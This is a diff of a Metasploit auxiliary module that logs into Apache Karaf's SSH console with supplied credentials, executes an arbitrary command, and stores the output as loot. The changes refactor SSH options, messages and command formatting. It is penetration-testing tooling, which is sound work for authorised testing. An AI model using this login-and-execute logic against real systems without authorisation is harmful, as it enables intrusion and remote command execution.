@@ -1,9 +1,8 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'net/ssh'
 
 class MetasploitModule < Msf::Auxiliary
@@ -26,13 +25,8 @@ class MetasploitModule < Msf::Auxiliary
         ],
       'Platform'       => 'unix',
       'Arch'           => ARCH_CMD,
-      'Targets'        =>
-        [
-          ['Apache Karaf', {}],
-        ],
       'Privileged'     => true,
-      'DisclosureDate' => "Feb 9 2016",
-      'DefaultTarget'  => 0))
+      'DisclosureDate' => '2016-02-09'))
 
     register_options(
       [
@@ -69,24 +63,22 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def do_login(user, pass, ip)
-    factory = ssh_socket_factory
-    opts = {
-      :auth_methods => ['password'],
-      :port         => rport,
-      :disable_agent => true,
-      :config => false,
-      :password         => pass,
-      :record_auth_info => true,
-      :proxy            => factory,
-      :non_interactive => true
-    }
+    opts = ssh_client_defaults.merge({
+      :auth_methods    => ['password'],
+      :port            => rport,
+      :password        => pass,
+    })
 
-    opts.merge!(:verbose => :debug) if datastore['SSH_DEBUG']
+    opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']
 
     begin
-      ssh = nil
-      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
-        ssh = Net::SSH.start(ip, user, opts)
+      ssh = ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
+        Net::SSH.start(ip, user, opts)
+      end
+      if ssh
+        print_good("#{ip}:#{rport} - Login Successful ('#{user}:#{pass})'")
+      else
+        print_error "#{ip}:#{rport} - Unknown error"
       end
     rescue OpenSSL::Cipher::CipherError => e
       print_error("#{ip}:#{rport} SSH - Unable to connect to this Apache Karaf (#{e.message})")
@@ -106,11 +98,6 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    if ssh
-      print_good("#{ip}:#{rport}- Login Successful with '#{user}:#{pass}'")
-    else
-      print_error "#{ip}:#{rport} - Unknown error"
-    end
     ssh
   end
 
@@ -118,7 +105,7 @@ class MetasploitModule < Msf::Auxiliary
     print_status("#{ip}:#{rport} - Attempt to login...")
     ssh = do_login(username, password, ip)
     if ssh
-      output = ssh.exec!("shell:exec #{cmd}\n").to_s
+      output = ssh.exec!("#{cmd}\n").to_s
       if output
         print_good("#{ip}:#{rport} - Command successfully executed.  Output: #{output}")
         store_loot("apache.karaf.command",
